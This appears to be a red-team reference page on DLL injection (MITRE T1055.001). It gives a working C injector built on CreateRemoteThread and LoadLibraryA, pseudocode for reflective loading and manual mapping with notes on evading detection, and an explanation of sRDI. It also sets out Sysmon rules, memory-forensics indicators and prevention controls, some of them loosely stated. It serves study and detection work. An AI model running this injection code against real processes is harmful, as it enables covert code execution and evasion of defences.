# DLL Injection Techniques

**MITRE ATT&CK**: T1055.001 - Process Injection: Dynamic-link Library Injection

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

DLL injection forces a target process to load an attacker-controlled DLL. Once loaded,
the DLL's DllMain function executes in the target's address space. There are three
main variants with increasing sophistication:

1. **Classic (CreateRemoteThread + LoadLibrary)**: Simplest; writes DLL path as string,
   calls LoadLibraryA in remote thread.
2. **Reflective DLL Injection**: The DLL contains its own loader and maps itself without
   using the Windows loader. No LoadLibrary call, no entry in the PEB module list.
3. **Manual Mapping**: The injector parses the PE, resolves imports, applies relocations,
   and maps sections -- acting as a custom PE loader.

## 1. Classic DLL Injection (CreateRemoteThread + LoadLibrary)

```c
#include <windows.h>
#include <stdio.h>

/*
 * Classic DLL injection:
 * We write the DLL path as a string into the remote process, then
 * create a remote thread that calls LoadLibraryA with that string
 * as its argument.
 *
 * This works because LoadLibraryA has the same signature as
 * LPTHREAD_START_ROUTINE: DWORD WINAPI func(LPVOID lpParam)
 * Both take a single pointer-sized parameter and return DWORD.
 *
 * The DLL's DllMain is called automatically by the loader with
 * fdwReason = DLL_PROCESS_ATTACH when LoadLibrary succeeds.
 */

int dll_inject(DWORD targetPid, const char *dllPath) {

    SIZE_T pathLen = strlen(dllPath) + 1;

    // Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, targetPid
    );
    if (!hProcess) return -1;

    // Allocate space for DLL path string in remote process
    LPVOID remotePath = VirtualAllocEx(
        hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE  // Note: RW, not RWX
    );
    if (!remotePath) {
        CloseHandle(hProcess);
        return -1;
    }

    // Write the DLL path string to remote memory
    WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL);

    // Get address of LoadLibraryA in kernel32.dll
    // Because kernel32.dll is loaded at the same base address in all processes
    // (ASLR randomizes per-boot, not per-process), we can use our local address.
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

    // Create remote thread that calls LoadLibraryA(remotePath)
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,  // thread start = LoadLibraryA
        remotePath,                              // argument = DLL path string
        0, NULL
    );
    if (!hThread) {
        VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 0;
}
```

## 2. Reflective DLL Injection (Concept)

```c
/*
 * Reflective DLL Injection Overview:
 *
 * The DLL itself contains a "ReflectiveLoader" export function that acts
 * as a custom PE loader. The injection process is:
 *
 * 1. Read the DLL file into a local buffer
 * 2. Allocate RWX memory in the target process
 * 3. Write the entire DLL (raw bytes) to the remote allocation
 * 4. CreateRemoteThread with start address = offset of ReflectiveLoader
 *    within the remote allocation
 *
 * The ReflectiveLoader function (executing in the remote process) then:
 *   a. Finds its own base address in memory (walks backward to MZ header)
 *   b. Parses its own PE headers
 *   c. Allocates a new region and maps itself section-by-section
 *   d. Processes the relocation table (.reloc) to fix addresses
 *   e. Resolves imports by walking kernel32's export table
 *      (finds kernel32 base via PEB->Ldr->InMemoryOrderModuleList)
 *   f. Calls DllMain(DLL_PROCESS_ATTACH)
 *
 * Key evasion advantage: LoadLibrary is never called, so the DLL does
 * NOT appear in the PEB's loaded module list (LDR_DATA_TABLE_ENTRY).
 * Tools that enumerate loaded modules via the PEB will not see it.
 */

// Pseudocode for the reflective loader concept:
void ReflectiveLoader(void) {
    // Step A: Find our own image base by scanning backward for "MZ"
    ULONG_PTR base = find_own_base();

    // Step B: Parse PE headers
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    // Step C: Allocate properly aligned memory, map sections
    LPVOID mapped = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    map_sections(mapped, base, nt);

    // Step D: Process relocations
    process_relocations(mapped, nt);

    // Step E: Resolve imports (manually walk kernel32 exports)
    resolve_imports(mapped, nt);

    // Step F: Call entry point
    DllMain_t entry = (DllMain_t)(mapped + nt->OptionalHeader.AddressOfEntryPoint);
    entry((HINSTANCE)mapped, DLL_PROCESS_ATTACH, NULL);
}
```

## 3. Manual Mapping (Concept)

```c
/*
 * Manual Mapping Overview:
 *
 * Similar to reflective injection, but the injector process performs
 * all the PE loading work rather than the DLL doing it itself.
 *
 * Steps performed by the injector:
 *   1. Read DLL file into local memory
 *   2. Parse PE headers locally
 *   3. Allocate remote memory sized to SizeOfImage
 *   4. Map each section to correct RVA in remote process
 *   5. Process relocation table (adjust for actual load address vs preferred)
 *   6. Resolve imports: for each imported function, find its address in
 *      the target process and write it to the IAT
 *   7. Write a small shellcode stub that calls DllMain
 *   8. Execute the stub via CreateRemoteThread or other execution method
 *
 * Evasion advantages over reflective injection:
 *   - Even smaller stub needed in the remote process
 *   - Section permissions can be set correctly (RX for .text, RW for .data)
 *   - The DLL file itself does not need a special ReflectiveLoader export
 *
 * Detection challenges:
 *   - No LoadLibrary call
 *   - DLL not in PEB module list
 *   - If section permissions are set correctly, no RWX regions
 */

// Pseudocode for manual mapping:
int manual_map(HANDLE hProcess, unsigned char *dllBytes) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)dllBytes;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(dllBytes + dos->e_lfanew);

    // Allocate in remote process
    LPVOID remoteBase = VirtualAllocEx(hProcess, NULL,
        nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Map headers
    WriteProcessMemory(hProcess, remoteBase, dllBytes,
        nt->OptionalHeader.SizeOfHeaders, NULL);

    // Map each section
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(hProcess,
            (LPVOID)((DWORD_PTR)remoteBase + sec[i].VirtualAddress),
            dllBytes + sec[i].PointerToRawData,
            sec[i].SizeOfRawData, NULL);
    }

    // Process relocations, resolve imports...
    // fix_relocations(hProcess, remoteBase, nt);
    // resolve_imports(hProcess, remoteBase, nt);

    // Set correct section permissions
    // VirtualProtectEx(hProcess, .text addr, .text size, PAGE_EXECUTE_READ, ...);
    // VirtualProtectEx(hProcess, .data addr, .data size, PAGE_READWRITE, ...);

    return 0;
}
```

## Detection & Prevention

### Module Load Events (Sysmon Event ID 7)

Classic DLL injection triggers a module load event because LoadLibrary is called.
Sysmon Event ID 7 logs the loaded image path, hash, and signature status.

**Detection rules look for**:
- DLLs loaded from unusual paths (e.g., temp directories, user-writable locations)
- Unsigned DLLs loaded into signed processes
- DLLs loaded shortly after a CreateRemoteThread event (Event ID 8)

```xml
<!-- Sysmon rule: DLL loaded from suspicious path -->
<ImageLoad onmatch="include">
    <ImageLoaded condition="contains">\Temp\</ImageLoaded>
    <ImageLoaded condition="contains">\AppData\</ImageLoaded>
    <Signed condition="is">false</Signed>
</ImageLoad>
```

### Unbacked Executable Memory

Reflective and manual mapping injections do NOT trigger module load events because
LoadLibrary is bypassed. Detection instead relies on:

- **Memory region analysis**: Scanning for executable memory regions (PAGE_EXECUTE_READ
  or PAGE_EXECUTE_READWRITE) that are not backed by a file on disk. These appear as
  "Private" rather than "Image" type in VAD tree analysis.
- **MZ/PE header scanning**: Scanning process memory for MZ/PE signatures in
  non-image regions reveals manually mapped or reflectively loaded DLLs.
- **Get-InjectedThread** (PowerShell): Enumerates threads whose start addresses
  point to unbacked memory.

### IAT (Import Address Table) Anomalies

Manually mapped DLLs may have incorrectly resolved or missing IAT entries.
Advanced detection compares the IAT of in-memory modules against expected
import resolutions for known legitimate DLLs.

### Behavioral Detection

1. **CreateRemoteThread + LoadLibrary**: The combination of CreateRemoteThread
   (Event ID 8) where the start address resolves to LoadLibraryA/W is a
   classic, high-confidence indicator.

2. **Kernel32 base address resolution**: Reflective loaders must find kernel32's
   base address by walking the PEB. The pattern of reading PEB->Ldr from
   unbacked code is detectable via API monitoring.

3. **DllMain execution from private memory**: If DllMain's call stack originates
   from non-image memory, the DLL was injected via reflective or manual mapping.

### Prevention

- **Code Integrity Guard (CIG)**: `ProcessSignaturePolicy` ensures only
  Microsoft-signed or WHQL-signed DLLs can be loaded. Blocks all three variants.
- **DLL search order hardening**: `SetDefaultDllDirectories` with
  `LOAD_LIBRARY_SEARCH_SYSTEM32` prevents loading from attacker-controlled paths.
- **Binary Signature Enforcement**: WDAC policies that enforce DLL signing.
- **Credential Guard**: Protects lsass with Virtualization Based Security,
  preventing DLL injection into the credential store process.
- **Export Address Filtering (EAF)**: EMET/Exploit Guard feature that detects
  when code reads export tables from unbacked memory (reflective loader behavior).

## sRDI - Shellcode Reflective DLL Injection

**sRDI** ([github.com/monoxgas/sRDI](https://github.com/monoxgas/sRDI)) bridges the gap between DLL injection and shellcode injection by converting any standard DLL into position-independent shellcode that reflectively loads itself.

### How sRDI Works

```
Traditional Reflective DLL Injection:
  DLL must be compiled WITH a ReflectiveLoader export
  → Requires source code modification or custom build process

sRDI Approach:
  ANY standard DLL → sRDI converter → Position-independent shellcode
  → No recompilation needed, works with off-the-shelf DLLs
```

**Process:**
1. **Input**: Any compiled DLL (does not need a ReflectiveLoader export)
2. **sRDI prepends a shellcode stub** that acts as a reflective loader
3. **Output**: Self-contained shellcode blob that, when executed:
   - Finds its own base address in memory
   - Parses the appended DLL's PE headers
   - Maps sections, processes relocations, resolves imports
   - Calls DllMain or a specified exported function
4. The shellcode can then be injected using **any** shellcode injection technique (VirtualAllocEx, APC, thread hijacking, etc.)

### Why sRDI Matters

| Advantage | Explanation |
|-----------|-------------|
| No source needed | Convert any existing DLL to injectable shellcode |
| Technique flexibility | Resulting shellcode works with any injection method |
| Function targeting | Can call a specific export, not just DllMain |
| Argument passing | Supports passing arguments to the target function |
| Cobalt Strike integration | Can be used with `execute-assembly` and BOFs |

### Detection Considerations

- **Same as reflective DLL injection**: Unbacked executable memory, PEB walking patterns, PE headers in private memory regions
- **Shellcode stub signature**: The sRDI loader stub has identifiable byte patterns that can be signatured with YARA
- **Memory forensics**: pe-sieve and Moneta detect the resulting in-memory PE
- **Entropy analysis**: The combined shellcode+DLL blob has characteristic entropy patterns

### Related Tools

| Tool | Relationship to sRDI |
|------|---------------------|
| **donut** | Similar concept but also handles .NET assemblies, EXEs, and VBS/JS; generates shellcode from various input formats |
| **Stephen Fewer's ReflectiveDLLInjection** | Original reflective injection research that sRDI builds upon |
| **Cobalt Strike** | Uses reflective loading natively; sRDI extends this to arbitrary DLLs |

## Cross-References

- [Reflective PE Loader](../evasion-techniques/pe-loader.md)
- [Shellcode Basics](../shellcode/shellcode-basics.md)
- [Process Hollowing](process-hollowing.md)
- [Classic Injection](classic-injection.md)
- [Module Stomping](module-stomping.md)
- [AV/EDR Evasion](../../06-defense-evasion/av-edr-evasion.md)
- [Code Injection Theory](../../03-execution/code-injection.md)

## References

- Stephen Fewer: Reflective DLL Injection (original research)
- monoxgas: sRDI - https://github.com/monoxgas/sRDI
- TheWover: donut - https://github.com/TheWover/donut
- MITRE ATT&CK T1055.001 (DLL Injection)
- MITRE ATT&CK T1620 (Reflective Code Loading)
- Elastic Security: Detecting Reflective DLL Loading
